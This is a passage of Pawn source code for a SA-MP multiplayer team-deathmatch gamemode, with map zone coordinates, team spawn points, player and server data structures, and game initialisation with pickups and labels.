	{"Prickle Pine",                {1534.50,2583.20,-89.00,1848.40,2863.20,110.90}},
	{"Prickle Pine",                {1117.40,2507.20,-89.00,1534.50,2723.20,110.90}},
	{"Prickle Pine",                {1848.40,2553.40,-89.00,1938.80,2863.20,110.90}},
	{"Prickle Pine",                {1938.80,2624.20,-89.00,2121.40,2861.50,110.90}},
	{"Queens",                      {-2533.00,458.40,0.00,-2329.30,578.30,200.00}},
	{"Queens",                      {-2593.40,54.70,0.00,-2411.20,458.40,200.00}},
	{"Queens",                      {-2411.20,373.50,0.00,-2253.50,458.40,200.00}},
	{"Randolph Industrial Estate",  {1558.00,596.30,-89.00,1823.00,823.20,110.90}},
	{"Redsands East",               {1817.30,2011.80,-89.00,2106.70,2202.70,110.90}},
	{"Redsands East",               {1817.30,2202.70,-89.00,2011.90,2342.80,110.90}},
	{"Redsands East",               {1848.40,2342.80,-89.00,2011.90,2478.40,110.90}},
	{"Redsands West",               {1236.60,1883.10,-89.00,1777.30,2142.80,110.90}},
	{"Redsands West",               {1297.40,2142.80,-89.00,1777.30,2243.20,110.90}},
	{"Redsands West",               {1377.30,2243.20,-89.00,1704.50,2433.20,110.90}},
	{"Redsands West",               {1704.50,2243.20,-89.00,1777.30,2342.80,110.90}},
	{"Regular Tom",                 {-405.70,1712.80,-3.00,-276.70,1892.70,200.00}},
	{"Richman",                     {647.50,-1118.20,-89.00,787.40,-954.60,110.90}},
	{"Richman",                     {647.50,-954.60,-89.00,768.60,-860.60,110.90}},
	{"Richman",                     {225.10,-1369.60,-89.00,334.50,-1292.00,110.90}},
	{"Richman",                     {225.10,-1292.00,-89.00,466.20,-1235.00,110.90}},
	{"Richman",                     {72.60,-1404.90,-89.00,225.10,-1235.00,110.90}},
	{"Richman",                     {72.60,-1235.00,-89.00,321.30,-1008.10,110.90}},
	{"Richman",                     {321.30,-1235.00,-89.00,647.50,-1044.00,110.90}},
	{"Richman",                     {321.30,-1044.00,-89.00,647.50,-860.60,110.90}},
	{"Richman",                     {321.30,-860.60,-89.00,687.80,-768.00,110.90}},
	{"Richman",                     {321.30,-768.00,-89.00,700.70,-674.80,110.90}},
	{"Robada Intersection",         {-1119.00,1178.90,-89.00,-862.00,1351.40,110.90}},
	{"Roca Escalante",              {2237.40,2202.70,-89.00,2536.40,2542.50,110.90}},
	{"Roca Escalante",              {2536.40,2202.70,-89.00,2625.10,2442.50,110.90}},
	{"Rockshore East",              {2537.30,676.50,-89.00,2902.30,943.20,110.90}},
	{"Rockshore West",              {1997.20,596.30,-89.00,2377.30,823.20,110.90}},
	{"Rockshore West",              {2377.30,596.30,-89.00,2537.30,788.80,110.90}},
	{"Rodeo",                       {72.60,-1684.60,-89.00,225.10,-1544.10,110.90}},
	{"Rodeo",                       {72.60,-1544.10,-89.00,225.10,-1404.90,110.90}},
	{"Rodeo",                       {225.10,-1684.60,-89.00,312.80,-1501.90,110.90}},
	{"Rodeo",                       {225.10,-1501.90,-89.00,334.50,-1369.60,110.90}},
	{"Rodeo",                       {334.50,-1501.90,-89.00,422.60,-1406.00,110.90}},
	{"Rodeo",                       {312.80,-1684.60,-89.00,422.60,-1501.90,110.90}},
	{"Rodeo",                       {422.60,-1684.60,-89.00,558.00,-1570.20,110.90}},
	{"Rodeo",                       {558.00,-1684.60,-89.00,647.50,-1384.90,110.90}},
	{"Rodeo",                       {466.20,-1570.20,-89.00,558.00,-1385.00,110.90}},
	{"Rodeo",                       {422.60,-1570.20,-89.00,466.20,-1406.00,110.90}},
	{"Rodeo",                       {466.20,-1385.00,-89.00,647.50,-1235.00,110.90}},
	{"Rodeo",                       {334.50,-1406.00,-89.00,466.20,-1292.00,110.90}},
	{"Royal Casino",                {2087.30,1383.20,-89.00,2437.30,1543.20,110.90}},
	{"San Andreas Sound",           {2450.30,385.50,-100.00,2759.20,562.30,200.00}},
	{"Santa Flora",                 {-2741.00,458.40,-7.60,-2533.00,793.40,200.00}},
	{"Santa Maria Beach",           {342.60,-2173.20,-89.00,647.70,-1684.60,110.90}},
	{"Santa Maria Beach",           {72.60,-2173.20,-89.00,342.60,-1684.60,110.90}},
	{"Shady Cabin",                 {-1632.80,-2263.40,-3.00,-1601.30,-2231.70,200.00}},
	{"Shady Creeks",                {-1820.60,-2643.60,-8.00,-1226.70,-1771.60,200.00}},
	{"Shady Creeks",                {-2030.10,-2174.80,-6.10,-1820.60,-1771.60,200.00}},
	{"Sobell Rail Yards",           {2749.90,1548.90,-89.00,2923.30,1937.20,110.90}},
	{"Spinybed",                    {2121.40,2663.10,-89.00,2498.20,2861.50,110.90}},
	{"Starfish Casino",             {2437.30,1783.20,-89.00,2685.10,2012.10,110.90}},
	{"Starfish Casino",             {2437.30,1858.10,-39.00,2495.00,1970.80,60.90}},
	{"Starfish Casino",             {2162.30,1883.20,-89.00,2437.30,2012.10,110.90}},
	{"Temple",                      {1252.30,-1130.80,-89.00,1378.30,-1026.30,110.90}},
	{"Temple",                      {1252.30,-1026.30,-89.00,1391.00,-926.90,110.90}},
	{"Temple",                      {1252.30,-926.90,-89.00,1357.00,-910.10,110.90}},
	{"Temple",                      {952.60,-1130.80,-89.00,1096.40,-937.10,110.90}},
	{"Temple",                      {1096.40,-1130.80,-89.00,1252.30,-1026.30,110.90}},
	{"Temple",                      {1096.40,-1026.30,-89.00,1252.30,-910.10,110.90}},
	{"The Camel's Toe",             {2087.30,1203.20,-89.00,2640.40,1383.20,110.90}},
	{"The Clown's Pocket",          {2162.30,1783.20,-89.00,2437.30,1883.20,110.90}},
	{"The Emerald Isle",            {2011.90,2202.70,-89.00,2237.40,2508.20,110.90}},
	{"The Farm",                    {-1209.60,-1317.10,114.90,-908.10,-787.30,251.90}},
	{"The Four Dragons Casino",     {1817.30,863.20,-89.00,2027.30,1083.20,110.90}},
	{"The High Roller",             {1817.30,1283.20,-89.00,2027.30,1469.20,110.90}},
	{"The Mako Span",               {1664.60,401.70,0.00,1785.10,567.20,200.00}},
	{"The Panopticon",              {-947.90,-304.30,-1.10,-319.60,327.00,200.00}},
	{"The Pink Swan",               {1817.30,1083.20,-89.00,2027.30,1283.20,110.90}},
	{"The Sherman Dam",             {-968.70,1929.40,-3.00,-481.10,2155.20,200.00}},
	{"The Strip",                   {2027.40,863.20,-89.00,2087.30,1703.20,110.90}},
	{"The Strip",                   {2106.70,1863.20,-89.00,2162.30,2202.70,110.90}},
	{"The Strip",                   {2027.40,1783.20,-89.00,2162.30,1863.20,110.90}},
	{"The Strip",                   {2027.40,1703.20,-89.00,2137.40,1783.20,110.90}},
	{"The Visage",                  {1817.30,1863.20,-89.00,2106.70,2011.80,110.90}},
	{"The Visage",                  {1817.30,1703.20,-89.00,2027.40,1863.20,110.90}},
	{"Unity Station",               {1692.60,-1971.80,-20.40,1812.60,-1932.80,79.50}},
	{"Valle Ocultado",              {-936.60,2611.40,2.00,-715.90,2847.90,200.00}},
	{"Verdant Bluffs",              {930.20,-2488.40,-89.00,1249.60,-2006.70,110.90}},
	{"Verdant Bluffs",              {1073.20,-2006.70,-89.00,1249.60,-1842.20,110.90}},
	{"Verdant Bluffs",              {1249.60,-2179.20,-89.00,1692.60,-1842.20,110.90}},
	{"Verdant Meadows",             {37.00,2337.10,-3.00,435.90,2677.90,200.00}},
	{"Verona Beach",                {647.70,-2173.20,-89.00,930.20,-1804.20,110.90}},
	{"Verona Beach",                {930.20,-2006.70,-89.00,1073.20,-1804.20,110.90}},
	{"Verona Beach",                {851.40,-1804.20,-89.00,1046.10,-1577.50,110.90}},
	{"Verona Beach",                {1161.50,-1722.20,-89.00,1323.90,-1577.50,110.90}},
	{"Verona Beach",                {1046.10,-1722.20,-89.00,1161.50,-1577.50,110.90}},
	{"Vinewood",                    {787.40,-1310.20,-89.00,952.60,-1130.80,110.90}},
	{"Vinewood",                    {787.40,-1130.80,-89.00,952.60,-954.60,110.90}},
	{"Vinewood",                    {647.50,-1227.20,-89.00,787.40,-1118.20,110.90}},
	{"Vinewood",                    {647.70,-1416.20,-89.00,787.40,-1227.20,110.90}},
	{"Whitewood Estates",           {883.30,1726.20,-89.00,1098.30,2507.20,110.90}},
	{"Whitewood Estates",           {1098.30,1726.20,-89.00,1197.30,2243.20,110.90}},
	{"Willowfield",                 {1970.60,-2179.20,-89.00,2089.00,-1852.80,110.90}},
	{"Willowfield",                 {2089.00,-2235.80,-89.00,2201.80,-1989.90,110.90}},
	{"Willowfield",                 {2089.00,-1989.90,-89.00,2324.00,-1852.80,110.90}},
	{"Willowfield",                 {2201.80,-2095.00,-89.00,2324.00,-1989.90,110.90}},
	{"Willowfield",                 {2541.70,-1941.40,-89.00,2703.50,-1852.80,110.90}},
	{"Willowfield",                 {2324.00,-2059.20,-89.00,2541.70,-1852.80,110.90}},
	{"Willowfield",                 {2541.70,-2059.20,-89.00,2703.50,-1941.40,110.90}},
	{"Yellow Bell Station",         {1377.40,2600.40,-21.90,1492.40,2687.30,78.00}},
	{"Los Angeles",                 {44.60,-2892.90,-242.90,2997.00,-768.00,900.00}},
	{"Las Venturas",                {869.40,596.30,-242.90,2997.00,2993.80,900.00}},
	{"Area 51",                 {-480.50,596.30,-242.90,869.40,2993.80,900.00}},
	{"Tierra Robada",               {-2997.40,1659.60,-242.90,-480.50,2993.80,900.00}},
	{"Tierra Robada",               {-1213.90,596.30,-242.90,-480.50,1659.60,900.00}},
	{"San Fierro",                  {-2997.40,-1115.50,-242.90,-1213.90,1659.60,900.00}},
	{"Red County",                  {-1213.90,-768.00,-242.90,2997.00,596.30,900.00}},
	{"Flint County",                {-1213.90,-2892.90,-242.90,44.60,-768.00,900.00}},
	{"Whetstone",                   {-2997.40,-2892.90,-242.90,-1213.90,-1115.50,900.00}}
};
new Float:EurasiaSpawn[][] =
{
   {1085.0192,1884.2351,10.8203},
   {1092.0712,1915.7733,10.8203},
   {1148.1559,1973.5439,10.8203}

};
new Float:ArabSpawn[][] =
{
   {-754.8708,1590.7395,26.9609},
   {-729.4348,1538.6104,40.4290},
   {-799.0009,1551.8523,27.1172}
};
new Float:RussiaSpawn[][] =
{
   {-136.1105,1116.5667,20.1966},
   {-164.6844,1135.0851,19.7422},
   {-20.9232,1120.6238,19.8900}
};
new Float:AusSpawn[][] =
{
   {405.4855,2457.2576,16.5000},
   {415.0857,2534.5173,19.1484},
   {373.7360,2469.9290,16.4844}
};
new Float:USSpawn[][] =
{
   {-250.4555,2595.8433,62.8582},
   {-231.0395,2651.1475,62.8003},
   {-282.5961,2728.5774,62.1439}
};
new Float:MercSpawn[][] =
{
   {1085.0192,1884.2351,10.8203},
   {-754.8708,1590.7395,26.9609},
   {-136.1105,1116.5667,20.1966}
};
new Float:MARVELSpawn[][] =
{
   {-1419.25,2617.31,58.78},
   {-1514.72,2527.27,60.46},
   {-1534.39,2653.74,56.28}
};
//================================================//


#pragma unused ret_memcpy
#pragma dynamic 145000
#pragma tabsize 0
enum
{
    DIALOG_WELCOME,
    DIALOG_CREDITS
}
#define DIALOG_WELCOME 11
#define DIALOG_CREDITS 12
//=======Anti command spam========//
forward PMLog(string[]);




// Admin Area
new AdminArea[6] = {
377, 	// X
170, 	// Y
1008, 	// Z
90,     // Angle
3,      // Interior
0		// Virtual World
};

//Helper
//Anti_warn
new Anti_Warn[MAX_PLAYERS];
new Warn[MAX_PLAYERS];
new Text3D:Duty[MAX_PLAYERS];
new Text3D:DM[MAX_PLAYERS];


new VID[MAX_PLAYERS];

// Caps
#define UpperToLower(%1) for ( new ToLowerChar; ToLowerChar < strlen( %1 ); ToLowerChar ++ ) if ( %1[ ToLowerChar ]> 64 && %1[ ToLowerChar ] < 91 ) %1[ ToLowerChar ] += 32

// Spec
#define ADMIN_SPEC_TYPE_NONE 0
#define ADMIN_SPEC_TYPE_PLAYER 1
#define ADMIN_SPEC_TYPE_VEHICLE 2

// Enums
enum PlayerData
{
	Registered,
	LoggedIn,
	Level,
	Helper,
	Tag,
	dRank,
	Muted,
	Caps,
	Jailed,
	JailTime,
	Frozen,
	FreezeTime,
	Kills,
	Deaths,
	hours,
	mins,
	secs,
	TotalTime,
	ConnectTime,
 	MuteWarnings,
	Warnings,
	Spawned,
	TimesSpawned,
	God,
	GodCar,
	DoorsLocked,
	SpamCount,
	SpamTime,
	PingCount,
	PingTime,
	BotPing,
	blip,
	blipS,
	pPing[PING_MAX_EXCEEDS],
	pColour,
	pCar,
	Hide,
	SpecID,
	SpecType,
	OnDuty,
	bool:AllowedIn,
	FailLogin,
};
new PlayerInfo[MAX_PLAYERS][PlayerData];

//+++++++++++++++++++++++++New Textdraw Srijan+++++++++++++++++++++++++++

new Text:Textdraw0;
new Text:PSTATS1;
new Text:PSTATS2;

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
enum ServerData
{
	MaxPing,
	ReadPMs,
	ReadCmds,
	MaxAdminLevel,
	AdminOnlySkins,
	AdminSkin,
	AdminSkin2,
	NameKick,
	PartNameKick,
	AntiBot,
	AntiSpam,
 	AntiSwear,
 	NoCaps,
	Locked,
	Password[128],
	GiveWeap,
	GiveMoney,
	ConnectMessages,
	AdminCmdMsg,
	AutoLogin,
	MaxMuteWarnings,
	DisableChat,
	MustLogin,
	MustRegister,
};
new ServerInfo[ServerData];
enum rInfo
{
	Kills,
	Float:Damage,
}
new RoundInfo[MAX_PLAYERS][rInfo];

new Float:Pos[MAX_PLAYERS][4];

// rcon
new Chat[MAX_CHAT_LINES][128];

//Timers
new BlipTimer[MAX_PLAYERS];
new JailTimer[MAX_PLAYERS];
new FreezeTimer[MAX_PLAYERS];
new LockKickTimer[MAX_PLAYERS];

// Menus
#if defined USE_MENUS
new Menu:LMainMenu, Menu:AdminEnable, Menu:AdminDisable,
    Menu:LVehicles, Menu:twodoor, Menu:fourdoor, Menu:fastcar, Menu:Othercars,
	Menu:bikes, Menu:boats, Menu:planes, Menu:helicopters,
    Menu:XWeapons, Menu:XWeaponsBig, Menu:XWeaponsSmall, Menu:XWeaponsMore,
    Menu:LWeather,Menu:LTime,
    Menu:LTuneMenu, Menu:PaintMenu, Menu:LCars, Menu:LCars2,
    Menu:LTele, Menu:LasVenturasMenu, Menu:LosSantosMenu, Menu:SanFierroMenu,
	Menu:DesertMenu, Menu:FlintMenu, Menu:MountChiliadMenu,	Menu:InteriorsMenu;
#endif

// Forbidden Names & Words
new BadNames[100][100], // Whole Names
    BadNameCount = 0,
	BadPartNames[100][100], // Part of name
    BadPartNameCount = 0,
    ForbiddenWords[100][100],
    ForbiddenWordCount = 0;

// Report
new Reports[MAX_REPORTS][128];
new Bans[MAX_BANS][128];

new VehicleNames[212][] = {
	"Landstalker","Bravura","Buffalo","Linerunner","Pereniel","Sentinel","Dumper","Firetruck","Trashmaster","Stretch","Manana","Infernus",
	"Voodoo","Pony","Mule","Cheetah","Ambulance","Leviathan","Moonbeam","Esperanto","Taxi","Washington","Bobcat","Mr Whoopee","BF Injection",
	"Hunter","Premier","Enforcer","Securicar","Banshee","Predator","Bus","Rhino","Barracks","Hotknife","Trailer","Previon","Coach","Cabbie",
	"Stallion","Rumpo","RC Bandit","Romero","Packer","Monster","Admiral","Squalo","Seasparrow","Pizzaboy","Tram","Trailer","Turismo","Speeder",
	"Reefer","Tropic","Flatbed","Yankee","Caddy","Solair","Berkley's RC Van","Skimmer","PCJ-600","Faggio","Freeway","RC Baron","RC Raider",
	"Glendale","Oceanic","Sanchez","Sparrow","Patriot","Quad","Coastguard","Dinghy","Hermes","Sabre","Rustler","ZR3 50","Walton","Regina",
	"Comet","BMX","Burrito","Camper","Marquis","Baggage","Dozer","Maverick","News Chopper","Rancher","FBI Rancher","Virgo","Greenwood",
	"Jetmax","Hotring","Sandking","Blista Compact","Police Maverick","Boxville","Benson","Mesa","RC Goblin","Hotring Racer A","Hotring Racer B",
	"Bloodring Banger","Rancher","Super GT","Elegant","Journey","Bike","Mountain Bike","Beagle","Cropdust","Stunt","Tanker","RoadTrain",
	"Nebula","Majestic","Buccaneer","Shamal","Hydra","FCR-900","NRG-500","HPV1000","Cement Truck","Tow Truck","Fortune","Cadrona","FBI Truck",
	"Willard","Forklift","Tractor","Combine","Feltzer","Remington","Slamvan","Blade","Freight","Streak","Vortex","Vincent","Bullet","Clover",
	"Sadler","Firetruck","Hustler","Intruder","Primo","Cargobob","Tampa","Sunrise","Merit","Utility","Nevada","Yosemite","Windsor","Monster A",
	"Monster B","Uranus","Jester","Sultan","Stratum","Elegy","Raindance","RC Tiger","Flash","Tahoma","Savanna","Bandito","Freight","Trailer",
	"Kart","Mower","Duneride","Sweeper","Broadway","Tornado","AT-400","DFT-30","Huntley","Stafford","BF-400","Newsvan","Tug","Trailer A","Emperor",
	"Wayfarer","Euros","Hotdog","Club","Trailer B","Trailer C","Andromada","Dodo","RC Cam","Launch","Police Car (LSPD)","Police Car (SFPD)",
	"Police Car (LVPD)","Police Ranger","Picador","S.W.A.T. Van","Alpha","Phoenix","Glendale","Sadler","Luggage Trailer A","Luggage Trailer B",
	"Stair Trailer","Boxville","Farm Plow","Utility Trailer"
};
//==============================================================================
#define GREEN      0x80FF8096
#define RED       0xFF6347AA
#define BLUE      0x0015FFAA

#define COL_WHITE "{FFFFFF}"
#define COL_RED "{F81414}"
#define COL_GREEN "{00FF22}"
#define COL_LIGHTBLUE "{00CED1}"

forward Update(playerid);
forward SetZone(playerid);
forward UpdateLabelText(playerid);

new Text3D:RankLabel[MAX_PLAYERS];
new gTeam[MAX_PLAYERS];
new gClass[MAX_PLAYERS];
new GZ_ZONE1; //USA
new GZ_ZONE2; //EURASIA
new GZ_ZONE3; //AUSTRALIAN ARMADA
new GZ_ZONE4; //Soviet Union
new GZ_ZONE5;
new GZ_ZONE7;//Arabia
new RP; //Arabian Pickup
new EP;
new AP;
new A2P;
new MP;
new Text:I;
new	Text:EUR;
new	Text:A;
new	Text:S;
new	Text:U;
new	Text:A2;
new Text:Web;
new Text:E;
new VE;
new Text:Load;
new Text:welcometo1;
new Text:welcometo2;
new Text:BFB;
new Text:BFBO;
new Streak[MAX_PLAYERS];
new Skills[MAX_PLAYERS];
new Text:Star[10];
new Text:Rank1[MAX_PLAYERS];
new Text:TeamText[MAX_PLAYERS];


/*new Text:tBox;
new Text:Message[15];
new MessageStr[15][128];
*/

new tCP[30];
new UnderAttack[30] = 0;
new CP[30];
new Text:ZoneTextdraw_[4][MAX_PLAYERS];
new Zone[30];
new Captured[MAX_PLAYERS][30];
new UpdateTimer[MAX_PLAYERS];
new timer[MAX_PLAYERS][30];
new CountVar[MAX_PLAYERS][30];
new Text:CountText[MAX_PLAYERS];
new IsPlayerCapturing[MAX_PLAYERS][30];


main()
{
	print("\n---------2015_RWW2 V10.9.6--=LOADING=--------");
	print(" LATEST VERSION BY Perfect_Boy");
	print(" VERSION v10.9.6");
	print(" LOADED SUCESSFULLY!");
	print("----------------------------------\n");
	#if (USE_HARDCODED_PWS == true)
	    new hcpw = CheckHCPWSafety();
	    if (hcpw == -1) {
	        printf("[RconPro] Using hardcoded passwords: Security checks passed. System Made By Abhay");
	    } else {
	        printf("[RconPro] Using hardcoded passwords: WARNING: at least one password (%d) is not safe!", hcpw);
			#if (CLOSE_SERVER_ON_RISK == true)
   			    print("[RconPro] Security shutdown...");
			    SendRconCommand("exit");
			#endif
	    }
	    UpdateHCPWs();
	    SetTimer("UpdateHCPWs", PW_CHANGE_INTERVAL * 1000, 1);  //You can change value of update timer for procon index update
	#endif

	print("--------------------------------------\n");

	AntiDeAMX();
	
//======================clan sys ==============================================
	foreach(Player, x)
 	{
  		group[x][gid] = -1;
  		group[x][order] = -1;
    	group[x][invited] = -1;
     	group[x][attemptjoin] = -1;
     }
    print("  BFBO Group Script  ");
            
//========================clan end
	return 1;


}
//___________________________________________________________Pro con end____________________________________
public OnGameModeInit()
{
    mysql_debug(1);
	print("-------------------------------------");
	print("Loading database...");
	print("-------------------------------------");
	MySQLStartConnection();
    MyDatabaseInit();

	print("-------------------------------------");
	print("Loading custom maps....");
	print("-------------------------------------");
	LoadMaps();
	
	print("-------------------------------------");
	print("Loading Vehicles....");
	print("-------------------------------------");
	LoadVehicles();
	
	#if defined IRCENABLED
	print("-------------------------------------");
	print("IRC Bots Joining....");
	print("-------------------------------------");
	bot_irc_connect();
	#else
	print("-------------------------------------");
	print("IRC disabledby config....");
	print("-------------------------------------");
	#pragma unused bot_irc_connect
	#endif


 	LoadBox(-45);
	UsePlayerPedAnims();
	SetGameModeText("•XE•COD•RWW2™•V10.9.6•TDM•");
	SendRconCommand("mapname •SA/LS/TDM•XE•");
	for(new i; i<MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && !IsPlayerNPC(i))
		{
		#define SEC 1000
		#define MIN 60
		SetTimerEx("SavePlayer", 1, 5*SEC*MIN, "d", i);
		}
	}

	EnableBot = 1;
	//------Capture Zone Fix--------
  	tCP[SNAKE] = TEAM_NONE;
 	tCP[BAY] = TEAM_NONE;
 	tCP[BIG] = TEAM_NONE;
 	tCP[ARMY] = TEAM_NONE;
 	tCP[PETROL] = TEAM_NONE;
 	tCP[OIL] = TEAM_NONE;
 	tCP[DESERT] = TEAM_NONE;
	tCP[QUARRY] = TEAM_NONE;
	tCP[GUEST] = TEAM_NONE;
	tCP[EAR] = TEAM_NONE;
 	tCP[SUBS] = TEAM_NONE;


	UnderAttack[SNAKE] = 0;
	UnderAttack[BAY] = 0;
	UnderAttack[BIG] = 0;
	UnderAttack[ARMY] = 0;
	UnderAttack[PETROL] = 0;
	UnderAttack[OIL] = 0;
	UnderAttack[DESERT] = 0;
	UnderAttack[QUARRY] = 0;
	UnderAttack[GUEST] = 0;
	UnderAttack[EAR] = 0;
 	UnderAttack[SUBS] = 0;



	SetTimer("RandomMessage", 60000, 1);
	SetTimer("CountDown", 1000, 1);
	SetTimer("PayDay", 1000000, true);
	SetTimer("ZoneStats", 1000, true);
	SetTimer("OnServerTimeUpdate", 100000000000000000, true);
	SetTimer("UpdateLaunchTime", 100, true);
	SetTimer("uselessnrg",300000, true);
//    SetTimer("SaveAllPlayers",310000, true);
	
	//Proto type
/*
	A69Prot = AddStaticVehicle(428,215.8315,1860.0304,13.2654,1.1393,0,5);
	ProtLabel[A69Prot] = Create3DTextLabel("Area 69 Prototype", 0x00FF00FF, 0.0, 0.0, 0.0, 50.0, 0, 1);
	Attach3DTextLabelToVehicle(ProtLabel[A69Prot],A69Prot, 0.0, 0.0, 0.0);
*/

     AddPlayerClass(73,1110.1959,1909.0803,10.8203,5.0747,0,0,0,0,0,0); // EUR
     AddPlayerClass(179,-794.9099,1610.2480,29.7032,78.7860,0,0,0,0,0,0); // ARABIA
     AddPlayerClass(285,-136.0029,1115.9038,20.1966,3.7893,0,0,0,0,0,0); // RUSSIA
     AddPlayerClass(287,245.0012,1859.0973,14.0840,74.5591,0,0,0,0,0,0); //USA
     AddPlayerClass(206,405.5110,2451.0649,16.5000,0.2366,0,0,0,0,0,0); // AUSTRALIA
     AddPlayerClass(299,-3103.24,1752.23,53.39,0.4521,0,0,0,0,0,0);
     Create3DTextLabel("Antharx",0xFF66FFFF,-360.46,1597.50,76.71,30.0,1); Create3DTextLabel("Arabian Base",0xFF66FF,-360.46,1597.50,76.71,35.0,1);
     Create3DTextLabel("Arabian Team Briefcase",0xFFFF00AA,-797.42,1555.87,27.12,30.0,1); Create3DTextLabel("Army Guest House",0xFFFF00AA,-314.87,1772.42,43.64,30.0,1);
     Create3DTextLabel("Eurasian Team Briefcase",0x66CC00FF,1146.47,1975.78,10.82,30.0,1);
     //
     Create3DTextLabel("Vietnam Base",0xFF9900AA,-1494.97,2596.00,55.68,35.0,1); Create3DTextLabel("Army Restaurent",0xFFFF00AA,-550.66,2593.41,53.93,30.0,1); Create3DTextLabel("USA Base",0x3A47DEFF,-260.23,2632.11,62.10,35.0,1);
     Create3DTextLabel("Snake Farm",0xFFFF00AA,-35.83,2348.17,24.14,30.0,1); Create3DTextLabel("AREA 51",0xFFFF00AA,239.20,1859.77,13.65,30.0,1); Create3DTextLabel("BAY",0xFFFF00AA,260.88,2889.20,11.18,30.0,1);
     //
     Create3DTextLabel("Army Petrol Bunk",0xFFFF00AA,671.14,1704.32,7.19,30.0,1); Create3DTextLabel("Oil Factory",0xFFFF00AA,220.17,1423.02,1058,30.0,1); Create3DTextLabel("Gas Factory",0xFFFF00AA,559.30,1220.18,11.71,30.0,1);
     Create3DTextLabel("Quarry",0xFFFF00AA,589.93,875.22,-42.49,30.0,1); Create3DTextLabel("Soviet Base",0xFF0000AA,-79.11,1096.15,19.59,35.0,1); Create3DTextLabel("Soviet Team Briefcase",0xFF0000AA,-147.31,1109.98,19.74,30.0,1); Create3DTextLabel("Big Ear",0xFFFF00AA,-310.84,1541.67,75.56,30.0,1);
     //
     Create3DTextLabel("Australian Team Briefcase",0x4B00B0AA,385.10,2474.89,16.50,30.0,1);  Create3DTextLabel("Austrialian Base",0x4B00B0BAA,332.34,2515.81,16.91,35.0,1);
     Create3DTextLabel("USA Team Briefcase",0x3A47DEFF,-252.45,2604.25,62.85,30.0,1);  Create3DTextLabel("Vietnam Team Briefcase",0xFF9900AA,-1513.78,2521.46,55.85,30.0,1);
	 //Marvel



//=====================================================================================================================




//========================================================================================================
	// Don't use these lines if it's a filterscript



    Pickup[1] = CreatePickup(19130, 1, -150.4453,1110.0249,19.7500, -1);
	Pickup[2] = CreatePickup(19130, 1, -365.2002, 1597.1082, 76.7178, -1);
	Pickup[3] = CreatePickup(19130, 1, 388.8488,2530.4143,16.5391, -1);
	Pickup[4] = CreatePickup(19130, 1, -794.5327,1556.2026,27.1244, -1);
	Pickup[5] = CreatePickup(19130, 1, 210.98, 1822.96, 6.41);
	Pickup[6] = CreatePickup(19130, 1, 1149.6642,1976.5652,10.8203, -1);
	Pickup[7] = CreatePickup(19130, 1, 375.2281,2474.4160,16.5000, -1);
	Pickup[8] = CreatePickup(19130, 1, -250.4021,2603.1230,62.8582, -1);
	Pickup[9] = CreatePickup(19130, 1, -1508.46,2521.09,55.80, -1);
	Pickup[10] = CreatePickup(19130, 1, 1101.5459,1435.8047,12.4371, -1);
	Pickup[11] = CreatePickup(19130, 1, 1493.7737,-1603.2244,13.5469, -1);
	Pickup[12] = CreatePickup(19130, 1, 1913.0403,-1399.9194,13.5703, -1);
	Pickup[13] = CreatePickup(19130, 1, 284.1689,2030.7312,17.6406, -1);

	Labels[1] = Create3DTextLabel("{FFFF00}JikyBot: NRG SPAWN \n{FF00FF}[BIKE-SPAWN]", COLOR_BLUE2, -150.4453,1110.0249,19.7500, 50.0, 0, 0);
	Labels[2] = Create3DTextLabel("{FFFF00}JikyBot: NRG SPAWN \n{FF00FF}[BIKE-SPAWN]", COLOR_BLUE2, -365.2002, 1597.1082, 76.7178, 50.0, 0, 0);
	Labels[3] = Create3DTextLabel("{FFFF00}JikyBot: NRG SPAWN \n{FF00FF}[BIKE-SPAWN]", COLOR_BLUE2, 388.8488,2530.4143,16.5391, 50.0, 0, 0);
	Labels[4] = Create3DTextLabel("{FFFF00}JikyBot: NRG SPAWN \n{FF00FF}[BIKE-SPAWN]", COLOR_BLUE2, -794.5327,1556.2026,27.1244, 50.0, 0, 0);
	Labels[5] = Create3DTextLabel("{FFFF00}JikyBot: NRG SPAWN \n{FF00FF}[BIKE-SPAWN]", COLOR_BLUE2, 210.98, 1822.96, 6.41, 50.0, 0, 0);
	Labels[6] = Create3DTextLabel("{FFFF00}JikyBot: NRG SPAWN \n{FF00FF}[BIKE-SPAWN]", COLOR_BLUE2, 1149.6642,1976.5652,10.8203, 50.0, 0, 0);
	Labels[7] = Create3DTextLabel("{FFFF00}JikyBot: NRG SPAWN \n{FF00FF}[BIKE-SPAWN]", COLOR_BLUE2, 375.2281,2474.4160,16.5000, 50.0, 0, 0);
	Labels[8] = Create3DTextLabel("{FFFF00}JikyBot: NRG SPAWN \n{FF00FF}[BIKE-SPAWN]", COLOR_BLUE2, -250.4021,2603.1230,62.8582, 50.0, 0, 0);
	Labels[9] = Create3DTextLabel("{FFFF00}JikyBot: NRG SPAWN \n{FF00FF}[BIKE-SPAWN]", COLOR_BLUE2, -1508.46,2521.09,55.80, 50.0, 0, 0);
	Labels[10] = Create3DTextLabel("{FF00FF}Eurasia Spawn\n{FFFFFF}Mercenary Spawn\n{E10000}Spawn-Point", C_RED, 1085.0192,1884.2351,10.8203, 50.0, 0, 0);
	Labels[11] = Create3DTextLabel("{FF00FF}Eurasia Spawn\n{E10000}Spawn-Point", C_RED, 1092.0712,1915.7733,10.8203, 50.0, 0, 0);
	Labels[12] = Create3DTextLabel("{FF00FF}Eurasia Spawn\n{E10000}Spawn-Point", C_RED, 1148.1559,1973.5439,10.8203, 50.0, 0, 0);
	Labels[13] = Create3DTextLabel("{FFFF00}JikyBot: NRG SPAWN \n{FF00FF}[BIKE-SPAWN]", COLOR_BLUE2, 284.1689,2030.7312,17.6406, 50.0, 0, 0);
	Labels[14] = Create3DTextLabel("{FF9E00}Arab Spawn\n{FFFFFF}Mercenary Spawn\n{E10000}Spawn-Point", C_RED, -754.8708,1590.7395,26.9609, 50.0, 0, 0);
	Labels[15] = Create3DTextLabel("{FF9E00}Arab Spawn\n{E10000}Spawn-Point", C_RED, -729.4348,1538.6104,40.4290, 50.0, 0, 0);
	Labels[16] = Create3DTextLabel("{FF9E00}Arab Spawn\n{E10000}Spawn-Point", C_RED, -799.0009,1551.8523,27.1172, 50.0, 0, 0);
	Labels[17] = Create3DTextLabel("{FF0000}Russia Spawn\n{FFFFFF}Mercenay Spawn\n{E10000}Spawn-Point", C_RED, -136.1105,1116.5667,20.1966, 50.0, 0, 0);
